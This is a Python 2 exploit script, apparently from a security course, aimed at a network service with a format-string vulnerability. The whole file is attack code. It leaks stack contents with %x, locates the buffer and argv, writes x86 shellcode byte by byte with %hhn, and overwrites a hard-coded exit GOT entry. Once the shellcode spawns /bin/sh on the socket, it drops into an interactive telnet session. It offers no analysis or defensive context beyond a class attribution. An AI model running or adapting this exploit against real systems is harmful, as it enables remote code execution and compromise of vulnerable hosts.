#!/usr/bin/python
# This code is adopted from exploit python written by Chris Eagle in class

import os
import socket
import struct
import sys
import telnetlib

def readLine(s):
    receved = None
    while True:
            ch = s.recv(1)
            if ch:
                if receved is None:
                    receved = ch
                else:
                    receved += ch
                if ch == '\n':
                        break
            else:
                break
    return receved

def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def writeByte(s, addr, val, idx):
    format = "%%%05dc%%%d$hhn" % (val, idx + 4)
    format += "A"*(16 - len(format))
    sys.stdout.write(format)
    s.send(format)

sc ="\xbb\x04\x00\x00\x00\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80" + \
"\x41\xe2\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" + \
"\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

s = socket.socket()
s.connect((sys.argv[1], int(sys.argv[2])))

line = readLine(s)
sys.stdout.write(line)


s.send("AAAA %x %x %x %x %x %x %x %x %x %x %x %x\n")
line = readLine(s)

sys.stdout.write(line)

vals = line.split()
buf_start = vals.index('41414141')
print "buffer starts at %d" % buf_start

index = buf_start + 64
while True:
    s.send("%%%d$x %%%d$x\n" % (index, index + 1))
    line = readLine(s)
    vals = line.split()
    v0 = int(vals[0], 16)
    v1 = int(vals[1], 16)
    if v0 == 1 and v1 & 0xbff00000 == 0xbff00000:
        argv = v1
        break
    index += 1

print "argv = %x" % argv

idx = 0
for b in sc:
    print "Writing: s=%s, argv=%x, idx=%d, ord(b)=%d, buf_start=%d" % (s, argv, idx, ord(b), buf_start)
    writeByte(s, argv + idx, ord(b), buf_start)
    #readLine(s)
    idx += 1

exit = 0x08049f30
for i in range(4):
    writeByte(s, exit + i, (argv>> (8 * i)) & 0xff, buf_start)
    readLine(s)

s.send('quit\n')

interact(s)